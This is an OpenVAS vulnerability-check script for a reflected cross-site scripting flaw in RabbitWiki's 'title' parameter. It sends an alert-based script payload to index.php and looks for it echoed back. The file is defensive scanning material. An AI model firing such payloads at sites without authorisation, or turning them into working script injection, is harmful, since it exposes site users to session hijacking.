###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_rabbit_wiki_title_param_xss_vuln.nasl 11435 2018-09-17 13:44:25Z cfischer $
#
# RabbitWiki 'title' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802608");
  script_bugtraq_id(51971);
  script_version("$Revision: 11435 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-02-13 15:15:15 +0530 (Mon, 13 Feb 2012)");
  script_name("RabbitWiki 'title' Parameter Cross Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51971");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/109628/rabbitwiki-xss.txt");
  script_xref(name:"URL", value:"http://st2tea.blogspot.in/2012/02/rabbitwiki-cross-site-scripting.html");

  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site.");
  script_tag(name:"affected", value:"RabbitWiki");
  script_tag(name:"insight", value:"The flaw is due to an improper validation of user-supplied
  input to the 'title' parameter in 'index.php', which allows attackers to
  execute arbitrary HTML and script code in a user's browser session in the
  context of an affected site.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running RabbitWiki and is prone to cross site
  scripting vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/RabbitWiki", "/wiki", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/index.php", port: port);

  if(!isnull(res) && '>RabbitWiki<' >< res)
  {
    url = dir + "/index.php?title=<script>alert(/xss-test/)</script>";

    if(http_vuln_check(port:port, url:url, check_header: TRUE,
       pattern:"<script>alert\(/xss-test/\)</script>"))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);